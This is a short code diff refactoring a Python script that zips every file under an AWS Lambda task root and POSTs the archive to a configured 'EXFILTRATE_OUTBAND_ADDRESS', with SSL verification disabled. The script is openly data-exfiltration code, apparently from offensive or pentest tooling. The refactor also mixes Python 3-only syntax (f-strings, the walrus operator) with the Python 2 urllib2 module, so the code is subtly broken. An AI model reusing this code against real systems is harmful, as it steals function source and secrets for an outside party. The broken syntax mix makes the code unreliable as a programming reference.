@@ -48,7 +48,7 @@ def fetch_files(imz, rootdir):
         for filename in files:
             real_path = os.path.join(folder, filename)
             with open(real_path, 'r') as src:
-                zip_path = real_path.replace(rootdir + '/', '')
+                zip_path = real_path.replace(f'{rootdir}/', '')
                 imz.append(zip_path, src.read())
 
 def post(data):
@@ -64,8 +64,8 @@ def post(data):
 
     ssl._create_default_https_context = ssl._create_unverified_context
     r = urllib2.Request(EXFILTRATE_OUTBAND_ADDRESS, data=data, headers=headers)
-    resp = urllib2.urlopen(r)
-    if resp: resp.read()
+    if resp := urllib2.urlopen(r):
+        resp.read()
 
 def main():
     rootdir = os.environ['LAMBDA_TASK_ROOT']
